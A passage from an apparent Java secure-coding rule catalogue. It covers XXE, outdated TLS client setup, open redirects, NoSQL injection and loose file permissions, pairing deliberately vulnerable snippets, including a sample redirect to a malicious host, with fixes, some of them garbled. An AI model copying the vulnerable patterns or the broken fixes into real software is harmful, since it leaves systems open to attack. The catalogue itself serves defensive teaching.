    <span class="n">SAXParser</span> <span class="n">saxParser</span> <span class="o">=</span> <span class="n">factory</span><span class="o">.</span><span class="na">newSAXParser</span><span class="o">();</span>

    <span class="c1">// Create an XML reader to set the entity resolver.</span>
    <span class="n">XMLReader</span> <span class="n">reader</span> <span class="o">=</span> <span class="n">saxParser</span><span class="o">.</span><span class="na">getXMLReader</span><span class="o">();</span>
    <span class="n">reader</span><span class="o">.</span><span class="na">setEntityResolver</span><span class="o">(</span><span class="k">new</span> <span class="n">CustomResolver</span><span class="o">());</span>
    <span class="n">reader</span><span class="o">.</span><span class="na">setContentHandler</span><span class="o">(</span><span class="n">defaultHandler</span><span class="o">);</span>

    <span class="n">InputSource</span> <span class="n">is</span> <span class="o">=</span> <span class="k">new</span> <span class="n">InputSource</span><span class="o">(</span><span class="n">inStream</span><span class="o">);</span>
    <span class="n">reader</span><span class="o">.</span><span class="na">parse</span><span class="o">(</span><span class="n">is</span><span class="o">);</span>
  <span class="o">}</span>

  <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="n">String</span><span class="o">[]</span> <span class="n">args</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">ParserConfigurationException</span><span class="o">,</span>
      <span class="n">SAXException</span><span class="o">,</span> <span class="n">IOException</span> <span class="o">{</span>
    <span class="k">try</span> <span class="o">{</span>
      <span class="n">receiveXMLStream</span><span class="o">(</span><span class="k">new</span> <span class="n">FileInputStream</span><span class="o">(</span><span class="s">"evil.xml"</span><span class="o">),</span> 
      <span class="k">new</span> <span class="n">DefaultHandler</span><span class="o">());</span>
    <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">java</span><span class="o">.</span><span class="na">net</span><span class="o">.</span><span class="na">MalformedURLException</span> <span class="n">mue</span><span class="o">)</span> <span class="o">{</span>
      <span class="n">System</span><span class="o">.</span><span class="na">err</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">"Malformed URL Exception: "</span> <span class="o">+</span> <span class="n">mue</span><span class="o">);</span>
    <span class="o">}</span>
  <span class="o">}</span>
<span class="o">}</span>
</pre></div>
</td></tr></table>
<h3 id="fixed-code-example-2-forbidding-the-use-of-external-entity">Fixed code Example 2 : forbidding the use of external entity</h3>
<p>class XXE {
  private static void receiveXMLStream(InputStream inStream, 
      DefaultHandler defaultHandler) throws ParserConfigurationException, 
      SAXException, IOException {
    SAXParserFactory factory = SAXParserFactory.newInstance();
    SAXParser saxParser = factory.newSAXParser();</p>
<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre>1
2
3
4
5
6
7
8
9</pre></div></td><td class="code"><div class="highlight"><pre><span></span><span class="o">//</span> <span class="nt">Create</span> <span class="nt">an</span> <span class="nt">XML</span> <span class="nt">reader</span> <span class="nt">to</span> <span class="nt">set</span> <span class="nt">the</span> <span class="nt">parameters</span><span class="o">.</span>
<span class="nt">XMLReader</span> <span class="nt">reader</span> <span class="o">=</span> <span class="nt">saxParser</span><span class="p">.</span><span class="nc">getXMLReader</span><span class="o">();</span>

<span class="o">//</span> <span class="nt">Disable</span> <span class="nt">external</span> <span class="nt">entity</span>
<span class="nt">reader</span><span class="p">.</span><span class="nc">setFeature</span><span class="o">(</span><span class="nt">http</span><span class="o">://</span><span class="nt">xml</span><span class="p">.</span><span class="nc">org</span><span class="o">/</span><span class="nt">sax</span><span class="o">/</span><span class="nt">features</span><span class="o">/</span><span class="nt">external-general-entities</span><span class="err">"</span><span class="o">,</span> <span class="nt">false</span><span class="o">);</span>
<span class="nt">reader</span><span class="p">.</span><span class="nc">setContentHandler</span><span class="o">(</span><span class="nt">defaultHandler</span><span class="o">);</span>

<span class="nt">InputSource</span> <span class="nt">is</span> <span class="o">=</span> <span class="nt">new</span> <span class="nt">InputSource</span><span class="o">(</span><span class="nt">inStream</span><span class="o">);</span>
<span class="nt">reader</span><span class="p">.</span><span class="nc">parse</span><span class="o">(</span><span class="nt">is</span><span class="o">);</span>
</pre></div>
</td></tr></table>
<p>}</p>
<p>public static void main(String[] args) throws ParserConfigurationException,
      SAXException, IOException {
    try {
      receiveXMLStream(new FileInputStream("evil.xml"), 
      new DefaultHandler());
    } catch (java.net.MalformedURLException mue) {
      System.err.println("Malformed URL Exception: " + mue);
    }
  }
}
```</p>
<h1 id="references">References</h1>
<div class="footnote">
<hr/>
<ol>
<li id="fn-cwe">
<p>http://cwe.mitre.org/data/definitions/611.html <a class="footnote-backref" href="#fnref-cwe" title="Jump back to footnote 1 in the text">↩</a></p>
</li>
<li id="fn-CERT">
<p>https://wiki.sei.cmu.edu/confluence/display/java/IDS17-J.+Prevent+XML+External+Entity+Attacks.html <a class="footnote-backref" href="#fnref-CERT" title="Jump back to footnote 2 in the text">↩</a></p>
</li>
</ol>
</div>
            </div>
            <div class="tag-cloud">
                <p>
                <a href="../../tag/c.html">C</a>
                <a href="../../tag/c.html">C++</a>
                <a href="../../tag/java.html">JAVA</a>
                <a href="../../tag/cwe-611.html">CWE-611</a>
                <a href="../../tag/find-sec-bugs.html">FIND-SEC-BUGS</a>
                </p>
            </div>
        </article>

        <article class="single">
            <header>
                <div class="breadcrumb">
                <ol>
                    <li>
                        <a href="../../standard/java.html">java</a>
                    </li>
                    <li>
                            <a href="../../subcategory/java/security issues.html">Security issues</a>
                    </li>
                    <li>
                            <a href="../../subcategory/java/security issues/security policy management.html">Security policy management</a>
                    </li>
                </ol>
                
                </div>

                <h1 id="PE7505">DefaultHttpClient with default constructor is not compatible with TLS 1.2</h1>
                <p>
                    Posted on September 28, 2024 in <a href="../../category/security-policy-management.html">Security policy management</a>

                    &#8226; 1 min read
                </p>
            </header>

                <div class="toc">
<ul>
<li><a href="#description">Description</a></li>
<li><a href="#vulnerability-and-risk">Vulnerability and risk</a></li>
<li><a href="#likelihood-of-exploit">Likelihood of Exploit</a></li>
<li><a href="#references">References</a></li>
</ul>
</div>

            <div>
                
<h1 id="description">Description</h1>
<p>DefaultHttpClient with default constructor is not compatible with TLS 1.2</p>
<h1 id="vulnerability-and-risk">Vulnerability and risk</h1>
<p><p>
<b>Vulnerable Code:</b><br/>
<pre>
    HttpClient client = new DefaultHttpClient();
</pre>
</p>
<p>
<p><b>Solution:</b><br/></p>
<p>Upgrade your implementation to use one of the recommended constructs and configure https.protocols JVM option to include TLSv1.2:</p></p>
<p>
<ul>
<li>Use <a href="http://hc.apache.org/httpcomponents-client-ga/httpclient/apidocs/org/apache/http/impl/client/SystemDefaultHttpClient.html">SystemDefaultHttpClient</a> instead</li>
<p>
<b>Sample Code:</b><br/>
<pre>
HttpClient client = new SystemDefaultHttpClient();
</pre>
</p>
<li>Create an HttpClient based on SSLSocketFactory - get an SSLScoketFactory instance with <a href="https://hc.apache.org/httpcomponents-client-ga/httpclient/apidocs/org/apache/http/conn/ssl/SSLSocketFactory.html#getSystemSocketFactory()">getSystemSocketFactory()</a> and use this instance for HttpClient creation</li>
<li>Create an HttpClient based on SSLConnectionSocketFactory - get an instance with <a href="https://hc.apache.org/httpcomponents-client-ga/httpclient/apidocs/org/apache/http/conn/ssl/SSLConnectionSocketFactory.html#getSystemSocketFactory()">getSystemSocketFactory()</a> and use this instance for HttpClient creation</li>
<li>Use HttpClientBuilder - call <a href="http://hc.apache.org/httpcomponents-client-ga/httpclient/apidocs/org/apache/http/impl/client/HttpClientBuilder.html#useSystemProperties()">useSystemProperties()</a> before calling build()</li>
<p>
<b>Sample Code:</b><br/>
<pre>
HttpClient client = HttpClientBuilder.create().useSystemProperties().build();
</pre>
</p>
<li>HttpClients - call <a href="https://hc.apache.org/httpcomponents-client-ga/httpclient/apidocs/org/apache/http/impl/client/HttpClients.html#createSystem()">createSystem()</a> to create an instance</li>
<p>
<b>Sample Code:</b><br/>
<pre>
HttpClient client = HttpClients.createSystem();
</pre>
</p>
</ul>
</p>
<h1 id="likelihood-of-exploit">Likelihood of Exploit</h1>
<p>high</p>
<h1 id="references">References</h1>
<p><a href="https://blogs.oracle.com/java-platform-group/entry/diagnosing_tls_ssl_and_https">Diagnosing TLS, SSL, and HTTPS</a>
</p></p>
            </div>
            <div class="tag-cloud">
                <p>
                <a href="../../tag/java.html">JAVA</a>
                <a href="../../tag/find-sec-bugs.html">FIND-SEC-BUGS</a>
                </p>
            </div>
        </article>

        <article class="single">
            <header>
                <div class="breadcrumb">
                <ol>
                    <li>
                        <a href="../../standard/java.html">java</a>
                    </li>
                    <li>
                            <a href="../../subcategory/java/security issues.html">Security issues</a>
                    </li>
                    <li>
                            <a href="../../subcategory/java/security issues/input validation and representation.html">Input validation and representation</a>
                    </li>
                </ol>
                
                </div>

                <h1 id="PE0091">URL Redirection to Untrusted Site</h1>
                <p>
                    Posted on September 28, 2024 in <a href="../../category/input-validation-and-representation.html">Input validation and representation</a>

                    &#8226; 3 min read
                </p>
            </header>

                <div class="toc">
<ul>
<li><a href="#description">Description</a></li>
<li><a href="#vulnerability-and-risk">Vulnerability and risk</a></li>
<li><a href="#potential-mitigations">Potential Mitigations</a></li>
<li><a href="#likelihood-of-exploit">Likelihood of Exploit</a></li>
<li><a href="#demonstrative-examples">Demonstrative Examples</a><ul>
<li><a href="#vulnerable-code-example-1">Vulnerable code Example 1</a><ul>
<li><a href="#fixed-code-example-1">Fixed code Example 1</a></li>
</ul>
</li>
<li><a href="#vulnerable-code-example-2">Vulnerable code Example 2</a><ul>
<li><a href="#fixed-code-example-2">Fixed code Example 2</a></li>
</ul>
</li>
</ul>
</li>
<li><a href="#references">References</a></li>
</ul>
</div>

            <div>
                
<h1 id="description">Description</h1>
<p>A web application accepts a user-controlled input that specifies a link to an external site, and uses that link in a Redirect.</p>
<h1 id="vulnerability-and-risk">Vulnerability and risk</h1>
<p>By modifying untrusted URL input to a malicious site, an attacker may successfully launch a phishing scam and steal user credentials. Because the server name in the modified link is identical to the original site, phishing attempts may have a more trustworthy appearance. Unvalidated redirect and forward attacks can also be used to maliciously craft a URL that would pass the application’s access control check and then forward the attacker to privileged functions that they would normally not be able to access. </p>
<h1 id="potential-mitigations">Potential Mitigations</h1>
<p>Safe use of redirects and forwards can be done in a number of ways:  </p>
<ol>
<li>Simply avoid using redirects and forwards.  </li>
<li>If used, do not allow the url as user input for the destination. This can usually be done. In this case, you should have a method to validate URL.  </li>
<li>If user input can’t be avoided, ensure that the supplied value is valid, appropriate for the application, and is authorized for the user.   </li>
<li>It is recommended that any such destination input be mapped to a value, rather than the actual URL or portion of the URL, and that server side code translate this value to the target URL.  </li>
<li>Sanitize input by creating a list of trusted URL's (lists of hosts or a regex).  </li>
<li>Force all redirects to first go through a page notifying users that they are going off of your site, and have them click a link to confirm.  </li>
</ol>
<h1 id="likelihood-of-exploit">Likelihood of Exploit</h1>
<p>Critical</p>
<h1 id="demonstrative-examples">Demonstrative Examples</h1>
<h3 id="vulnerable-code-example-1">Vulnerable code Example 1</h3>
<p>The following Java code receives the URL from the 'url' GET parameter and redirects to that URL.</p>
<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre>1</pre></div></td><td class="code"><div class="highlight"><pre><span></span> <span class="n">response</span><span class="o">.</span><span class="na">sendRedirect</span><span class="o">(</span><span class="n">request</span><span class="o">.</span><span class="na">getParameter</span><span class="o">(</span><span class="s">"url"</span><span class="o">));</span>
</pre></div>
</td></tr></table>
<p>The code is vulnerable to an attack if no validation or extra method controls are applied to verify the certainty of the URL. This vulnerability could be used as part of a phishing scam by redirecting users to a malicious site. If no validation is applied, a malicious user could create a hyperlink to redirect your users to an unvalidated malicious website, for example:</p>
<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre>1</pre></div></td><td class="code"><div class="highlight"><pre><span></span> http://example.com/example.php?url=http://malicious.example.com
</pre></div>
</td></tr></table>
<p>The user sees the link directing to the original trusted site (example.com) and does not realize the redirection that could take place </p>
<h4 id="fixed-code-example-1">Fixed code Example 1</h4>
<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre>1
2
3
4
5
6</pre></div></td><td class="code"><div class="highlight"><pre><span></span>  <span class="n">string</span> <span class="n">redirect_url</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="na">getParameter</span><span class="o">(</span><span class="s">"url"</span><span class="o">);</span>

  <span class="c1">// Check the safety of the URL</span>
  <span class="k">if</span> <span class="o">(</span><span class="n">is_safe</span><span class="o">(</span><span class="n">redirect_url</span><span class="o">))</span> <span class="o">{</span>  
    <span class="n">response</span><span class="o">.</span><span class="na">sendRedirect</span><span class="o">(</span><span class="n">redirect_url</span><span class="o">);</span>
  <span class="o">}</span>
</pre></div>
</td></tr></table>
<h3 id="vulnerable-code-example-2">Vulnerable code Example 2</h3>
<p>When applications allow user input to forward requests between different parts of the site, the application must check that the user is authorized to access the url, perform the functions it provides, and it is an appropriate url request. If the application fails to perform these checks, an attacker crafted URL may pass the application’s access control check and then forward the attacker to an administrative function that is not normally permitted.</p>
<p>The following code is a Java servlet that will receive a GET request with a url parameter in the request to forward to the address specified in the url parameter. The servlet will retrieve the url parameter value from the request and complete the server-side forward processing before responding to the browser.</p>
<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre> 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15
16
17
18
19</pre></div></td><td class="code"><div class="highlight"><pre><span></span><span class="kd">public</span> <span class="kd">class</span> <span class="nc">ForwardServlet</span> <span class="kd">extends</span> <span class="n">HttpServlet</span> 
<span class="o">{</span>
  <span class="kd">protected</span> <span class="kt">void</span> <span class="nf">doGet</span><span class="o">(</span><span class="n">HttpServletRequest</span> <span class="n">request</span><span class="o">,</span> 
  <span class="n">HttpServletResponse</span> <span class="n">response</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">ServletException</span><span class="o">,</span> <span class="n">IOException</span> <span class="o">{</span>
    <span class="n">String</span> <span class="n">query</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="na">getQueryString</span><span class="o">();</span>
    <span class="k">if</span> <span class="o">(</span><span class="n">query</span><span class="o">.</span><span class="na">contains</span><span class="o">(</span><span class="s">"fwd"</span><span class="o">))</span> 
    <span class="o">{</span>
      <span class="n">String</span> <span class="n">fwd</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="na">getParameter</span><span class="o">(</span><span class="s">"fwd"</span><span class="o">);</span>
      <span class="k">try</span> 
      <span class="o">{</span>
        <span class="n">request</span><span class="o">.</span><span class="na">getRequestDispatcher</span><span class="o">(</span><span class="n">fwd</span><span class="o">).</span><span class="na">forward</span><span class="o">(</span><span class="n">request</span><span class="o">,</span> <span class="n">response</span><span class="o">);</span>
      <span class="o">}</span> 
      <span class="k">catch</span> <span class="o">(</span><span class="n">ServletException</span> <span class="n">e</span><span class="o">)</span> 
      <span class="o">{</span>
        <span class="n">e</span><span class="o">.</span><span class="na">printStackTrace</span><span class="o">();</span>
      <span class="o">}</span>
    <span class="o">}</span>
  <span class="o">}</span>
<span class="o">}</span>
</pre></div>
</td></tr></table>
<h4 id="fixed-code-example-2">Fixed code Example 2</h4>
<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre> 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15
16
17
18
19
20
21
22</pre></div></td><td class="code"><div class="highlight"><pre><span></span><span class="kd">public</span> <span class="kd">class</span> <span class="nc">ForwardServlet</span> <span class="kd">extends</span> <span class="n">HttpServlet</span> 
<span class="o">{</span>
  <span class="kd">protected</span> <span class="kt">void</span> <span class="nf">doGet</span><span class="o">(</span><span class="n">HttpServletRequest</span> <span class="n">request</span><span class="o">,</span> 
  <span class="n">HttpServletResponse</span> <span class="n">response</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">ServletException</span><span class="o">,</span> <span class="n">IOException</span> <span class="o">{</span>
    <span class="n">String</span> <span class="n">query</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="na">getQueryString</span><span class="o">();</span>
    <span class="k">if</span> <span class="o">(</span><span class="n">query</span><span class="o">.</span><span class="na">contains</span><span class="o">(</span><span class="s">"fwd"</span><span class="o">))</span> 
    <span class="o">{</span>
      <span class="n">String</span> <span class="n">fwd</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="na">getParameter</span><span class="o">(</span><span class="s">"fwd"</span><span class="o">);</span>
      <span class="k">try</span> 
      <span class="o">{</span>
     <span class="c1">// Check the authority and safety of the request first</span>
     <span class="k">if</span><span class="o">(</span><span class="n">isAutherized</span> <span class="n">and</span> <span class="nf">isSafe</span><span class="o">(</span><span class="n">request</span><span class="o">))</span> <span class="o">{</span>
            <span class="n">request</span><span class="o">.</span><span class="na">getRequestDispatcher</span><span class="o">(</span><span class="n">fwd</span><span class="o">).</span><span class="na">forward</span><span class="o">(</span><span class="n">request</span><span class="o">,</span> <span class="n">response</span><span class="o">);</span>
  <span class="o">}</span>
      <span class="o">}</span> 
      <span class="k">catch</span> <span class="o">(</span><span class="n">ServletException</span> <span class="n">e</span><span class="o">)</span> 
      <span class="o">{</span>
        <span class="n">e</span><span class="o">.</span><span class="na">printStackTrace</span><span class="o">();</span>
      <span class="o">}</span>
    <span class="o">}</span>
  <span class="o">}</span>
<span class="o">}</span>
</pre></div>
</td></tr></table>
<h1 id="references">References</h1>
<div class="footnote">
<hr/>
<ol>
<li id="fn-cwe">
<p>http://cwe.mitre.org/data/definitions/601.html <a class="footnote-backref" href="#fnref-cwe" title="Jump back to footnote 1 in the text">↩</a></p>
</li>
<li id="fn-owasp">
<p>https://www.owasp.org/index.php/Unvalidated_Redirects_and_Forwards_Cheat_Sheet.html <a class="footnote-backref" href="#fnref-owasp" title="Jump back to footnote 2 in the text">↩</a></p>
</li>
</ol>
</div>
            </div>
            <div class="tag-cloud">
                <p>
                <a href="../../tag/c.html">C</a>
                <a href="../../tag/c.html">C++</a>
                <a href="../../tag/java.html">JAVA</a>
                <a href="../../tag/cwe-601.html">CWE-601</a>
                <a href="../../tag/find-sec-bugs.html">FIND-SEC-BUGS</a>
                </p>
            </div>
        </article>

        <article class="single">
            <header>
                <div class="breadcrumb">
                <ol>
                    <li>
                        <a href="../../standard/java.html">java</a>
                    </li>
                    <li>
                            <a href="../../subcategory/java/security issues.html">Security issues</a>
                    </li>
                    <li>
                            <a href="../../subcategory/java/security issues/input validation and representation.html">Input validation and representation</a>
                    </li>
                </ol>
                
                </div>

                <h1 id="PE1086">NoSQL Injection</h1>
                <p>
                    Posted on September 28, 2024 in <a href="../../category/input-validation-and-representation.html">Input validation and representation</a>

                    &#8226; 1 min read
                </p>
            </header>

                <div class="toc">
<ul>
<li><a href="#description">Description</a></li>
<li><a href="#vulnerability-and-risk">Vulnerability and risk</a></li>
<li><a href="#likelihood-of-exploit">Likelihood of Exploit</a></li>
<li><a href="#potential-mitigations">Potential Mitigations</a></li>
<li><a href="#demonstrative-examples">Demonstrative Examples</a><ul>
<li><a href="#vulnerable-code-example">Vulnerable Code Example</a></li>
</ul>
</li>
<li><a href="#references">References</a></li>
</ul>
</div>

            <div>
                
<h1 id="description">Description</h1>
<p>NoSQL databases provide looser consistency restrictions than traditional SQL databases. By requiring fewer relational constraints and consistency checks, NoSQL databases often offer performance and scaling benefits. Yet these databases are still potentially vulnerable to injection attacks, even if they aren't using the traditional SQL syntax.</p>
<h1 id="vulnerability-and-risk">Vulnerability and risk</h1>
<p>Because these NoSQL injection attacks may execute within a procedural language, rather than in the declarative SQL language, the potential impacts are greater than traditional SQL injection.</p>
<h1 id="likelihood-of-exploit">Likelihood of Exploit</h1>
<p>Medium</p>
<h1 id="potential-mitigations">Potential Mitigations</h1>
<ul>
<li>
<p>Run your code using the lowest privileges that are required to accomplish the necessary tasks.</p>
</li>
<li>
<p>Assume all input is malicious. Use an "accept known good" input validation strategy, i.e., use a whitelist of acceptable inputs that strictly conform to specifications.</p>
</li>
</ul>
<h1 id="demonstrative-examples">Demonstrative Examples</h1>
<h3 id="vulnerable-code-example">Vulnerable Code Example</h3>
<p>An example vulnerability is exposed in the following code, if user input is passed directly into the MongoDB query without sanitization:</p>
<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre>1</pre></div></td><td class="code"><div class="highlight"><pre><span></span><span class="nx">db</span><span class="p">.</span><span class="nx">myCollection</span><span class="p">.</span><span class="nx">find</span><span class="p">(</span> <span class="p">{</span> <span class="nx">active</span><span class="o">:</span> <span class="kc">true</span><span class="p">,</span> <span class="nx">$where</span><span class="o">:</span> <span class="kd">function</span><span class="p">()</span> <span class="p">{</span> <span class="k">return</span> <span class="nx">obj</span><span class="p">.</span><span class="nx">credits</span> <span class="o">-</span> <span class="nx">obj</span><span class="p">.</span><span class="nx">debits</span> <span class="o">&lt;</span> <span class="nx">$userInput</span><span class="p">;</span> <span class="p">}</span> <span class="p">}</span> <span class="p">);;</span>
</pre></div>
</td></tr></table>
<p>Even if a query depended on no user input, such as the following example, an attacker could exploit MongoDB by replacing the operator with malicious data:</p>
<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre>1</pre></div></td><td class="code"><div class="highlight"><pre><span></span><span class="nx">db</span><span class="p">.</span><span class="nx">myCollection</span><span class="p">.</span><span class="nx">find</span><span class="p">(</span> <span class="p">{</span> <span class="nx">$where</span><span class="o">:</span> <span class="kd">function</span><span class="p">()</span> <span class="p">{</span> <span class="k">return</span> <span class="nx">obj</span><span class="p">.</span><span class="nx">credits</span> <span class="o">-</span> <span class="nx">obj</span><span class="p">.</span><span class="nx">debits</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">;</span> <span class="p">}</span> <span class="p">}</span> <span class="p">);</span>
</pre></div>
</td></tr></table>
<h1 id="references">References</h1>
<div class="footnote">
<hr/>
<ol>
<li id="fn-owasp">
<p>https://www.owasp.org/index.php/Testing_for_NoSQL_injection <a class="footnote-backref" href="#fnref-owasp" title="Jump back to footnote 1 in the text">↩</a></p>
</li>
</ol>
</div>
            </div>
            <div class="tag-cloud">
                <p>
                <a href="../../tag/java.html">JAVA</a>
                </p>
            </div>
        </article>

        <article class="single">
            <header>
                <div class="breadcrumb">
                <ol>
                    <li>
                        <a href="../../standard/java.html">java</a>
                    </li>
                    <li>
                            <a href="../../subcategory/java/security issues.html">Security issues</a>
                    </li>
                    <li>
                            <a href="../../subcategory/java/security issues/input validation and representation.html">Input validation and representation</a>
                    </li>
                </ol>
                
                </div>

                <h1 id="PE1082">File Permission Manipulation</h1>
                <p>
                    Posted on September 28, 2024 in <a href="../../category/input-validation-and-representation.html">Input validation and representation</a>

                    &#8226; 1 min read
                </p>
            </header>

                <div class="toc">
<ul>
<li><a href="#description">Description</a></li>
<li><a href="#vulnerability-and-risk">Vulnerability and risk</a></li>
<li><a href="#likelihood-of-exploit">Likelihood of Exploit</a></li>
<li><a href="#potential-mitigations">Potential Mitigations</a></li>
<li><a href="#demonstrative-examples">Demonstrative Examples</a><ul>
<li><a href="#vulnerable-code-example">Vulnerable code Example</a></li>
<li><a href="#fixed-code-example">Fixed Code Example</a></li>
</ul>
</li>
<li><a href="#references">References</a></li>
</ul>
</div>

            <div>
                
<h1 id="description">Description</h1>
<p>When a file is given a permissions setting that provides access to a wider range of actors than required, it could lead to the exposure of sensitive information, or the modification of that resource by unintended parties. This is especially dangerous when the file is related to program configuration, execution or sensitive user data. </p>
<h1 id="vulnerability-and-risk">Vulnerability and risk</h1>
<p>Sensitive information leaked or program configuration error</p>
<h1 id="likelihood-of-exploit">Likelihood of Exploit</h1>
<p>Medium</p>
<h1 id="potential-mitigations">Potential Mitigations</h1>
<p>Strict control over file permissions</p>
<h1 id="demonstrative-examples">Demonstrative Examples</h1>
<h3 id="vulnerable-code-example">Vulnerable code Example</h3>
<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre>1
2
3
4
5
6
7
8
9</pre></div></td><td class="code"><div class="highlight"><pre><span></span><span class="kd">public</span> <span class="kd">class</span> <span class="nc">Example</span> <span class="o">{</span>
    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">setPermissionsByInputFile</span><span class="o">(</span><span class="n">Path</span> <span class="n">path</span><span class="o">,</span> <span class="n">File</span> <span class="n">inputFile</span><span class="o">)</span> <span class="o">{</span>
        <span class="k">try</span> <span class="o">(</span><span class="n">BufferedReader</span> <span class="n">reader</span> <span class="o">=</span> <span class="k">new</span> <span class="n">BufferedReader</span><span class="o">(</span><span class="k">new</span> <span class="n">FileReader</span><span class="o">(</span><span class="n">inputFile</span><span class="o">)))</span> <span class="o">{</span>
            <span class="n">Files</span><span class="o">.</span><span class="na">setPosixFilePermissions</span><span class="o">(</span><span class="n">path</span><span class="o">,</span> <span class="n">PosixFilePermissions</span><span class="o">.</span><span class="na">fromString</span><span class="o">(</span><span class="n">reader</span><span class="o">.</span><span class="na">readLine</span><span class="o">()));</span>
        <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">Exception</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
            <span class="n">e</span><span class="o">.</span><span class="na">printStackTrace</span><span class="o">();</span>
        <span class="o">}</span>
    <span class="o">}</span>
<span class="o">}</span>
</pre></div>
</td></tr></table>
<p>Read string input from file to set permissions. May lead to uncontrolled file permissions</p>
<h3 id="fixed-code-example">Fixed Code Example</h3>
<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre>1
2
3
4
5
6
7
8
9</pre></div></td><td class="code"><div class="highlight"><pre><span></span><span class="kd">public</span> <span class="kd">class</span> <span class="nc">testgood</span> <span class="o">{</span>
    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">test</span><span class="o">(</span><span class="n">Path</span> <span class="n">path</span><span class="o">,</span> <span class="n">File</span> <span class="n">file</span><span class="o">)</span> <span class="o">{</span>
        <span class="k">try</span> <span class="o">(</span><span class="n">BufferedReader</span> <span class="n">reader</span> <span class="o">=</span> <span class="k">new</span> <span class="n">BufferedReader</span><span class="o">(</span><span class="k">new</span> <span class="n">FileReader</span><span class="o">(</span><span class="n">file</span><span class="o">)))</span> <span class="o">{</span>
            <span class="n">Files</span><span class="o">.</span><span class="na">setPosixFilePermissions</span><span class="o">(</span><span class="n">path</span><span class="o">,</span> <span class="n">parsePermission</span><span class="o">(</span><span class="n">reader</span><span class="o">.</span><span class="na">readLine</span><span class="o">()));</span>
        <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">Exception</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
            <span class="n">e</span><span class="o">.</span><span class="na">printStackTrace</span><span class="o">();</span>
        <span class="o">}</span>
    <span class="o">}</span>
<span class="o">}</span>
</pre></div>
</td></tr></table>
<p>Through <code>parsePermission</code> function, verifing permissions from string input.</p>
<h1 id="references">References</h1>
<div class="footnote">
<hr/>
<ol>
<li id="fn-CWE732">
<p>https://cwe.mitre.org/data/definitions/732.html <a class="footnote-backref" href="#fnref-CWE732" title="Jump back to footnote 1 in the text">↩</a></p>
</li>
<li id="fn-OWASP-A5">
<p>https://www.owasp.org/index.php/Top_10-2017_A5-Broken_Access_Control <a class="footnote-backref" href="#fnref-OWASP-A5" title="Jump back to footnote 2 in the text">↩</a></p>
</li>
</ol>
</div>
            </div>
            <div class="tag-cloud">
                <p>
                <a href="../../tag/c.html">C</a>
                <a href="../../tag/cpp.html">CPP</a>
                <a href="../../tag/java.html">Java</a>
                </p>
            </div>
        </article>

        <article class="single">
            <header>
                <div class="breadcrumb">
                <ol>
                    <li>
                        <a href="../../standard/java.html">java</a>
                    </li>
                    <li>
                            <a href="../../subcategory/java/security issues.html">Security issues</a>
                    </li>
                    <li>
                            <a href="../../subcategory/java/security issues/privacy leakage.html">Privacy leakage</a>
                    </li>
                </ol>
                
                </div>

                <h1 id="PE7390">Class extends Servlet class and uses instance variables</h1>
                <p>
                    Posted on September 28, 2024 in <a href="../../category/privacy-leakage.html">Privacy leakage</a>

                    &#8226; 1 min read
                </p>
            </header>

                <div class="toc">
<ul>
<li><a href="#description">Description</a></li>
<li><a href="#vulnerability-and-risk">Vulnerability and risk</a></li>
<li><a href="#likelihood-of-exploit">Likelihood of Exploit</a></li>
</ul>
</div>

            <div>
                
<h1 id="description">Description</h1>
<p>Class extends Servlet class and uses instance variables</p>
<h1 id="vulnerability-and-risk">Vulnerability and risk</h1>
<p><p>
    This class extends from a Servlet class, and uses an instance member variable. Since only
    one instance of a Servlet class is created by the J2EE framework, and used in a
    multithreaded way, this paradigm is highly discouraged and most likely problematic. Consider
    only using method local variables.
    </p></p>
<h1 id="likelihood-of-exploit">Likelihood of Exploit</h1>
<p>high</p>
            </div>
            <div class="tag-cloud">
                <p>
                <a href="../../tag/java.html">JAVA</a>
                <a href="../../tag/find-bugs.html">FIND-BUGS</a>
                </p>
            </div>
        </article>

        <article class="single">
            <header>
                <div class="breadcrumb">
                <ol>
                    <li>
                        <a href="../../standard/java.html">java</a>
                    </li>
                    <li>
                            <a href="../../subcategory/java/security issues.html">Security issues</a>
                    </li>
                    <li>
                            <a href="../../subcategory/java/security issues/privacy leakage.html">Privacy leakage</a>
                    </li>
                </ol>
                
                </div>

                <h1 id="PE0136">Reveal stack traces</h1>
                <p>
                    Posted on September 28, 2024 in <a href="../../category/privacy-leakage.html">Privacy leakage</a>

                    &#8226; 1 min read
                </p>
            </header>

                <div class="toc">
<ul>
<li><a href="#description">Description</a></li>
<li><a href="#vulnerability-and-risk">Vulnerability and risk</a></li>
<li><a href="#potential-mitigations">Potential Mitigations</a></li>
<li><a href="#likelihood-of-exploit">Likelihood of Exploit</a></li>
<li><a href="#demonstrative-examples">Demonstrative Examples</a><ul>
<li><a href="#vulnerable-code-example">Vulnerable code Example</a></li>
<li><a href="#fixed-code-example">Fixed code Example</a></li>
</ul>
